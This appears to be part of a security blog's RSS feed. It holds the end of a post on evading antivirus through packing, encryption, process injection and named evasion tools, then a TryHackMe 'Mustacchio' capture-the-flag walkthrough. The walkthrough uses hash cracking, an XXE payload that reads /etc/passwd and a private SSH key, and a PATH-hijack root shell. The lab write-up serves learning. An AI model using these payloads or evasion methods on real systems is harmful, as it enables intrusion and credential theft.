+&lt;li&gt;&lt;strong&gt;Cryptography&lt;/strong&gt;- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Packing&lt;/strong&gt;- the code is condensed into a smaller binary file which results in a different signature on the payload.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Encoding&lt;/strong&gt;- the payload may be encoded as base64, hexadecimal, or other types of encodings.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;in-memory-evasion&#34;&gt;In-Memory Evasion&lt;/h2&gt;
+&lt;p&gt;The following is a technique used for in-memory evasion:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use Windows APIs to inject a payload into a running process&lt;/li&gt;
+&lt;li&gt;Payload is executed in the memory of running process in a separate thread&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;command-line-tools&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*H6l629Qydy1pFxjjyoQn9A.jpeg&#34; alt=&#34;&#34;  /&gt;
+
+Command-Line Tools&lt;/h2&gt;
+&lt;p&gt;Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Veil-Evasion&lt;/li&gt;
+&lt;li&gt;Shellter&lt;/li&gt;
+&lt;li&gt;Invoke-Obfuscation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;going-deeper&#34;&gt;Going Deeper&lt;/h1&gt;
+&lt;p&gt;Here are some resources for those who are looking for a deeper understanding of antivirus evasion.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://youtu.be/iz1twCSJZyo&#34;&gt;Veil-Evasion Complete Tutorial&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion&#34;&gt;Defense Evasion — Red Team Notes 2.0&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://youtu.be/V3_vc7BO9lU&#34;&gt;Malware Analysis Bootcamp - Extracting Strings&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://youtu.be/WmJcbDfy9L4&#34;&gt;ATT&amp;amp;CK Deep Dive: Defense Evasion&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/&#34;&gt;Windows Red Team Defense Evasion Techniques&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*W1qjqIKKNMK9_QYWXGQzRw.png" alt="picture of a bug"  />
+</p>
+<h1 id="how-does-antivirus-software-actuallywork">How Does Antivirus Software Actually Work?</h1>
+<p>Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.</p>
+<h2 id="signature-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ehROjARifrRnkEITjkFwMw.png" alt=""  />
+
+Signature-Based Detection</h2>
+<p>The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.</p>
+<p>Downsides to this approach:</p>
+<ul>
+<li>The database only stores the values of known signatures</li>
+<li>Newer variations of malware may go undetected if their new signature is not stored in the database</li>
+<li>Viruses can be easily and quickly altered to change their signature</li>
+</ul>
+<h2 id="anomaly-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8jt-Qw_ai_h_GCSJV15fuQ.png" alt=""  />
+
+Anomaly-Based Detection</h2>
+<p>Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a <strong>machine learning model</strong> that was trained using data from the past years of the company using the antivirus software.</p>
+<h2 id="heuristic-based-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*meCStYsucAG7XXY88Lnj0w.jpeg" alt=""  />
+
+Heuristic-Based Detection</h2>
+<p>This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.</p>
+<p>Additionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.</p>
+<h1 id="how-to-evade-antivirus-detection"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*VY6GEFR7NyUkIPcXNT49bg.jpeg" alt=""  />
+
+How to Evade Antivirus Detection</h1>
+<h2 id="on-disk-evasion"><strong>On-Disk Evasion</strong></h2>
+<p>The following are techniques used for on-disk evasion:</p>
+<ul>
+<li><strong>Obfuscation</strong>- this method involves rewriting the code to appear more confusing and harder to read.</li>
+<li><strong>Cryptography</strong>- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory.</li>
+<li><strong>Packing</strong>- the code is condensed into a smaller binary file which results in a different signature on the payload.</li>
+<li><strong>Encoding</strong>- the payload may be encoded as base64, hexadecimal, or other types of encodings.</li>
+</ul>
+<h2 id="in-memory-evasion">In-Memory Evasion</h2>
+<p>The following is a technique used for in-memory evasion:</p>
+<ul>
+<li>Use Windows APIs to inject a payload into a running process</li>
+<li>Payload is executed in the memory of running process in a separate thread</li>
+</ul>
+<h2 id="command-line-tools"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*H6l629Qydy1pFxjjyoQn9A.jpeg" alt=""  />
+
+Command-Line Tools</h2>
+<p>Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:</p>
+<ul>
+<li>Veil-Evasion</li>
+<li>Shellter</li>
+<li>Invoke-Obfuscation</li>
+</ul>
+<h1 id="going-deeper">Going Deeper</h1>
+<p>Here are some resources for those who are looking for a deeper understanding of antivirus evasion.</p>
+<ul>
+<li><a href="https://youtu.be/iz1twCSJZyo">Veil-Evasion Complete Tutorial</a></li>
+<li><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion">Defense Evasion — Red Team Notes 2.0</a></li>
+<li><a href="https://youtu.be/V3_vc7BO9lU">Malware Analysis Bootcamp - Extracting Strings</a></li>
+<li><a href="https://youtu.be/WmJcbDfy9L4">ATT&amp;CK Deep Dive: Defense Evasion</a></li>
+<li><a href="https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/">Windows Red Team Defense Evasion Techniques</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt</title>
+      <link>http://localhost:1313/ally-petitt/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</link>
+      <pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;introduction&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!&lt;/p&gt;
+&lt;p&gt;Notes: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;To begin, I scanned for open ports using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;RustScan&lt;/a&gt;. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;FFUF&lt;/a&gt; (you can also use Wfuzz, Gobuster, or DirBuster for this part).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ffuf -u &amp;lt;http://10.10.93.193/FUZZ&amp;gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png&#34; alt=&#34;&#34;  /&gt;
+
+The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png&#34; alt=&#34;&#34;  /&gt;
+
+And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png&#34; alt=&#34;&#34;  /&gt;
+
+How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.&lt;/p&gt;
+&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&amp;gt; .tables   users   sqlite&amp;gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png&#34; alt=&#34;&#34;  /&gt;
+
+And we have our password! With the newfound credentials &lt;code&gt;admin:bulldog19&lt;/code&gt; I logged into the admin console on port 8765. Success! The credentials worked.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png&#34; alt=&#34;&#34;  /&gt;
+
+While looking at the page source, two things immediately stand out to me.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;I see a comment left by the developer&lt;/li&gt;
+&lt;li&gt;The name of the input box is “xml”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png&#34; alt=&#34;&#34;  /&gt;
+
+When I try press submit without writing anything in the textarea, I am greeted by the following alert:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png&#34; alt=&#34;&#34;  /&gt;
+
+Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the &lt;a href=&#34;https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870&#34;&gt;most common XML vulnerabilities&lt;/a&gt; is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this &lt;a href=&#34;https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/&#34;&gt;blog post&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;`&lt;?xml version=”1.0&#34; encoding=”UTF-8&#34;?&gt;&lt;/p&gt;
+&lt;!DOCTYPE comment [&lt;!ENTITY xee SYSTEM “/etc/passwd”&gt; ]&gt;  
+&lt;comment&gt;  
+ &lt;com&gt;&amp;xee;&lt;/com&gt;  
+&lt;/comment&gt;`
+&lt;p&gt;When I type this in the text area and press “Submit”, I see the following on my screen:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png&#34; alt=&#34;&#34;  /&gt;
+
+Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.&lt;/p&gt;
+&lt;h1 id=&#34;usertxt&#34;&gt;User.txt&lt;/h1&gt;
+&lt;p&gt;Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed &lt;code&gt;/etc/passwd&lt;/code&gt; to &lt;code&gt;/home/barry/.ssh/id_rsa&lt;/code&gt; as &amp;ldquo;id_rsa&amp;rdquo; is a common name for the file containing a private ssh key.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png&#34; alt=&#34;&#34;  /&gt;
+
+Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, &lt;strong&gt;making sure that there is no white space&lt;/strong&gt;. I changed the permissions on the file using this command:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;chmod 400 id_rsa_barry&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I went to ssh into the machine and this was my result:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png&#34; alt=&#34;&#34;  /&gt;
+
+It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ python3 /usr/share/john/ssh2john.py id_rsa_barry &amp;gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png&#34; alt=&#34;&#34;  /&gt;
+
+Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.&lt;/p&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png&#34; alt=&#34;&#34;  /&gt;
+
+Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;First, I took a look at Barry’s id.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;It appears that he is not in any groups that we could use for privilege escalation. I also used &lt;code&gt;sudo -l&lt;/code&gt; to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;barry@mustacchio:~$ find / -perm -4000 2&amp;gt;/dev/null  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/eject/dmcrypt-get-device  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/policykit-1/polkit-agent-helper-1  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/snapd/snap-confine  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/openssh/ssh-keysign  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/passwd  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/pkexec  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chfn  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newgrp  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/at  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/chsh  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newgidmap  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/sudo  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/newuidmap  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/bin/gpasswd  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;**/home/joe/live\_log**  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/ping  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/ping6  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/umount  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/mount  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/fusermount  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ cd /home/joe &amp;amp;&amp;amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And we do! When I run it, it appears to launch an application.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png&#34; alt=&#34;&#34;  /&gt;
+
+This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the &lt;code&gt;strings&lt;/code&gt; command. Additionally, I used &lt;code&gt;awk&lt;/code&gt; so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$ strings live_log | awk ‘length($0) &amp;gt; 15’&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png&#34; alt=&#34;&#34;  /&gt;
+
+Interesting. There is a path to “access.log” and the full path for the &lt;code&gt;tail&lt;/code&gt; command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.&lt;/p&gt;
+&lt;p&gt;`$ export PATH=/tmp&lt;br&gt;
+$ cd /tmp&lt;br&gt;
+$ echo “/bin/bash -p” &amp;gt; tail&lt;br&gt;
+$ /bin/chmod +x tail&lt;br&gt;
+$ /home/joe/live_log&lt;/p&gt;
+&lt;h1 id=&#34;usrbinwhoami&#34;&gt;/usr/bin/whoami&lt;/h1&gt;
+&lt;p&gt;root&lt;/p&gt;
+&lt;h1 id=&#34;bincat-rootroottxt&#34;&gt;/bin/cat /root/root.txt&lt;/h1&gt;
+&lt;p&gt;[REDACTED]`&lt;/p&gt;
+&lt;p&gt;And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from &lt;code&gt;/usr/bin/tail&lt;/code&gt; to &lt;code&gt;/tmp/tail&lt;/code&gt; which allowed us to run &lt;code&gt;/bin/bash&lt;/code&gt; as root, giving us a root shell.&lt;/p&gt;
+&lt;p&gt;That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt-5a02aa208/&#34;&gt;via LinkedIn&lt;/a&gt;. Thank you and take care!&lt;/p&gt;
+</description>
+      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png" alt=""  />
+</p>
+<h1 id="introduction"><strong>Introduction</strong></h1>
+<p>Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!</p>
+<p>Notes: </p>
+<ul>
+<li>This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows</li>
+</ul>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<p>To begin, I scanned for open ports using <a href="https://github.com/RustScan/RustScan">RustScan</a>. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:</p>
+<p><code>PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></p>
+<p>As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using <a href="https://github.com/ffuf/ffuf">FFUF</a> (you can also use Wfuzz, Gobuster, or DirBuster for this part).</p>
+<p><code>ffuf -u &lt;http://10.10.93.193/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png" alt=""  />
+
+The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png" alt=""  />
+
+And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.</p>
+<p><code>$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b</code></p>
+<p>From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png" alt=""  />
+
+How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:</p>
+<p><code>$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&gt; .tables   users   sqlite&gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;</code></p>
+<p>And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.</p>
+<p><code>$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png" alt=""  />
+
+And we have our password! With the newfound credentials <code>admin:bulldog19</code> I logged into the admin console on port 8765. Success! The credentials worked.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png" alt=""  />
+
+While looking at the page source, two things immediately stand out to me.</p>
+<ol>
+<li>I see a comment left by the developer</li>
+<li>The name of the input box is “xml”</li>
+</ol>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png" alt=""  />
+
+When I try press submit without writing anything in the textarea, I am greeted by the following alert:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png" alt=""  />
+
+Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the <a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">most common XML vulnerabilities</a> is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this <a href="https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/">blog post</a>:</p>
+<p>`<?xml version=”1.0" encoding=”UTF-8"?></p>
+<!DOCTYPE comment [<!ENTITY xee SYSTEM “/etc/passwd”> ]>  
+<comment>  
+ <com>&xee;</com>  
+</comment>`
+<p>When I type this in the text area and press “Submit”, I see the following on my screen:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png" alt=""  />
+
+Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.</p>
+<h1 id="usertxt">User.txt</h1>
+<p>Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed <code>/etc/passwd</code> to <code>/home/barry/.ssh/id_rsa</code> as &ldquo;id_rsa&rdquo; is a common name for the file containing a private ssh key.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png" alt=""  />
+
